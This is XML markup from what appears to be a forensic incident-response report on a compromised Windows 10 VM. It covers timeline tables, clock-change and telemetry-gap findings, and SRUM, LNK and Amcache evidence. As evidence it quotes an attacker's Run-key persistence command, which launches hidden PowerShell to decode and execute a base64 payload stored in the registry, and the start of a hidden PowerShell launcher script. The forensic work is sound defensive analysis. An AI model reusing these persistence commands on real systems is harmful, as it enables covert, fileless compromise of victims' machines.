              <w:t>Amcache: file key written (≈ first execution / presence)</w:t>
              <w:br/>
              <w:t>e:\ftk imager\ftk imager.exe</w:t>
              <w:br/>
              <w:t>FTK Imager.exe SHA1=32756b3a319340c4b7fead410d3f36e503b30da2 accessdata® ftk® imager 4.2.1.4 compiled=2018-04-02 18:04:48.0000000 app=Unassociated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>amcacheparser/20261025201808_Amcache_UnassociatedFileEntries.csv#6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\AppCompat\Programs\Amcache.hve</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-002</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:13:18</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LNK files</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Target: created (recorded in the LNK) ; Target: modified (recorded in the LNK) ; Target: accessed (recorded in the LNK)</w:t>
              <w:br/>
              <w:t>E:\DESKTOP-SDN1RPT\Protected Files</w:t>
              <w:br/>
              <w:t>machine=desktop-sdn1rpt MAC=00:0c:29:14:c2:95 volume=A6125E71 Removable storage media (Floppy, USB) size=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>lecmd/lnk_F.csv#26</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\ricksanchez\AppData\Roaming\Microsoft\Windows\Recent\Protected Files.lnk</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-028</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:13:21.865279</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: RecentDocs</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Opened (RecentDocs) ; Last opened for the extension</w:t>
              <w:br/>
              <w:t>Incident_drive (E:)</w:t>
              <w:br/>
              <w:t>lnk=Incident_drive (E).lnk mru=0 RecentDocs</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_RecentDocs.csv#44</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-028</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:14:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (network usage per application)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM: network usage (end of period)</w:t>
              <w:br/>
              <w:t>\device\harddiskvolume3\windows\system32\coreupdater.exe</w:t>
              <w:br/>
              <w:t>received=170146 sent=26570 IF_TYPE_ETHERNET_CSMACD</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>srumecmd/20261025191812_SrumECmd_NetworkUsages_Output.csv#193</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\SRU\SRUDB.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-014, F-015, T-027</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:14:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (network usage per application)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM: network usage (end of period)</w:t>
              <w:br/>
              <w:t>\device\harddiskvolume3\windows\system32\windowspowershell\v1.0\powershell.exe</w:t>
              <w:br/>
              <w:t>received=178042 sent=15721 IF_TYPE_ETHERNET_CSMACD</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>srumecmd/20261025191812_SrumECmd_NetworkUsages_Output.csv#206</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\SRU\SRUDB.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-014, F-016</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:14:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (application resources)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM: resource usage (end of period)</w:t>
              <w:br/>
              <w:t>\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</w:t>
              <w:br/>
              <w:t>foreground read/written=1085952/40960 background read/written=0/0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>srumecmd/20261025191812_SrumECmd_AppResourceUseInfo_Output.csv#761</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\SRU\SRUDB.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-014</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:sectPr>
          <w:pgSz w:w="15840" w:h="12240" w:orient="landscape"/>
          <w:pgMar w:top="1020" w:right="1134" w:bottom="1020" w:left="1134" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>4. Detailed findings</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.1 System context and scope</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Host DESKTOP-SDN1RPT (setup name WIN-2IH1TBB9I4Q), Windows 10 Enterprise Evaluation build 19041 x64, VMware VM, installed 2020-09-18 05:47:03 UTC, TZ Pacific (ActiveTimeBias 420, UTC-7). Joined to domain C137.local at ~21:42 UTC 2020-09-18; static IP 10.42.85.115, DNS/DC 10.42.85.10. Accounts: local Admin (RID 1001, Administrators), domain users ricksanchez (-1106), mortysmith (-1108), domain Administrator (-500, RDP logon type 10 from 10.42.85.10 at 2020-09-19 03:36:24 — to be investigated). Last boot 2020-09-19 01:24:04. Responder acquisition from 05:08:58 (SanDisk USB "Incident_drive" E:, FTK Imager 4.2.1.4 at 05:09:56, memory image SystemTime 05:10:39); pcap covers 2020-09-18 21:58 → 2020-09-19 05:38. Early lead: HKLM Run "coreupdate" (hidden PowerShell executing base64 from HKLM\Software\q9Z1bssi\JqxNhWJA, written 03:44:03) that fired at 05:08:37 — not collection. Findings F-001..F-005 (system description, collection context, telemetry limitations, 4616 clock changes, empty parser outputs) and timeline T-001..T-003 recorded.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-004: Timeline anomaly: system clock changes (Security 4616) on 2020-09-18</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4F81BD"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low</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evtx:security.evtx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2020-09-18 04:58:02.307663 → 2020-09-19 01:54:37.447633</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Security 4616 by svchost.exe (LogonId 0x3E5, LOCAL SERVICE / W32Time-type adjustment): at 2020-09-18 04:58:02 PreviousTime 05:58:01.92 → NewTime 04:58:02.31 (clock set back 1 h); at 2020-09-18 22:43:05 PreviousTime 21:43:05.93 → NewTime 22:43:05.14 (clock set forward 1 h, shortly after domain join at 21:42). Other 4616 events are sub-second adjustments (04:58:40, 22:56:15, 23:10:08, 2020-09-19 01:54:37, 03:13:28). Events labelled with Computer DESKTOP-SDN1RPT at 2020-09-18 04:58 precede the OS setup boot at 05:41 under WIN-2IH1TBB9I4Q.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Most likely time-synchronisation corrections (VM/template clock, then domain time from the DC after the join), not attacker timestomping (executed by svchost under LocalService). Consequence: timestamps before 2020-09-18 22:43:05 may be offset by up to one hour relative to real time; the attack window (after 22:43) is not affected.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Evidence (3)</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04:58:02.307663</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2020-09-18 05:58:01.9239364 | NewTime: 2020-09-18 04:58:02.3055654 | LogonId: 0x3E5 | C:\Windows\System32\svchost.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#38143</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:43:05.144373</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2020-09-18 21:43:05.9283863 | NewTime: 2020-09-18 22:43:05.1440626 | LogonId: 0x3E5 | C:\Windows\System32\svchost.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#38518</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 01:54:37.447633</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2020-09-19 01:54:37.4418021 | NewTime: 2020-09-19 01:54:37.4469563 | LogonId: 0x3E5 | C:\Windows\System32\svchost.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39495</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-003: Scope limitation: no process-creation telemetry outside boot (no Sysmon, 4688 only at boot), PowerShell logs only cover 2020-09-19 05:08</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4F81BD"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low</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artifact:raw.prefetch_timeline</w:t>
              <w:br/>
              <w:t>artifact:run keys</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-powershell%4operational.evtx</w:t>
              <w:br/>
              <w:t>evtx:windows powershell.evtx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2020-09-19 03:44:03.540241 → 2020-09-19 05:08:42.966250</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>No Microsoft-Windows-Sysmon/Operational channel is present in raw.evtx. Security 4688 (78 events) only exists in the boot windows (2020-09-18 05:4x, 21:4x, 22:xx, 2020-09-19 01:24; last 4688 at 2020-09-19 01:24:08.2255671), i.e. process-creation auditing is not effective during the user sessions. Microsoft-Windows-PowerShell/Operational (9 events: 40961/53504/40962/4104) and Windows PowerShell (600/400/403, 15 events) only contain events between 2020-09-19 05:08:37 and 05:08:44, triggered at ricksanchez's logon. No 1102/104 log-clear events were found. HKLM Run value "coreupdate" (%COMSPEC% /b /c start /b /min powershell -nop -w hidden -c iex(... FromBase64String((Get-Item 'HKLM:Software\q9Z1bssi').GetValue('JqxNhWJA')))) last written 2020-09-19 03:44:03 explains the cmd.exe/powershell.exe executions at 05:08:37–05:08:43 (Prefetch) — these are NOT collection activity.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Execution reconstruction for the attack window must rely on Prefetch, Amcache, BAM, SRUM, ShimCache, memory (pslist/cmdline) and the network capture. The PowerShell logs only capture the payload launched by the "coreupdate" Run key at logon (a fileless persistence to be analysed in the persistence/execution steps); the absence of earlier PowerShell events may be due to the absence of PowerShell use before 05:08 through a logged host, to the log configuration, or to log rollover — undetermined at this stage (no clearing event observed).</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05:08:39.658503</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-PowerShell/Operational 40961 | Microsoft-Windows-PowerShell</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#15073</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-PowerShell%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:42.966250</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t xml:space="preserve">Microsoft-Windows-PowerShell/Operational 4104 | Microsoft-Windows-PowerShell | Contains contents of scripts run | Path:  | ScriptBlockText: if([IntPtr]::Size -eq 4){$b=$env:windir+'\sysnative\WindowsPowerShell\v1.0\powershell.exe'}else{$b='powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#15076</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-PowerShell%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:40.484484</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Windows PowerShell 600 | PowerShell | Provider is Started | HostApplication=powershell -nop -w hidden -c sleep 0; iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-Item 'HKLM:Software\q9Z1bssi').GetValue('JqxNhWJA'))))</w:t>
              <w:br/>
              <w:t xml:space="preserve"> | HostName=ConsoleHost</w:t>
              <w:br/>
              <w:t xml:space="preserve"> | HostVersion=5.1.19041.1</w:t>
              <w:br/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40903</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Windows PowerShell.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:44:03.540241</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Run keys</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>run: ts</w:t>
              <w:br/>
              <w:t>Microsoft\Windows\CurrentVersion\Run</w:t>
              <w:br/>
              <w:t>name=coreupdate | command={"executable":"%COMSPEC%","args":["/b /c start /b /min powershell -nop -w hidden -c \"sleep 0; iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-Item 'HKLM:Software\\q9Z1bssi').GetValue('JqxNhWJA'))))\""]}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect/runkeys.jsonl#5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sysvol/windows/system32/config/SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
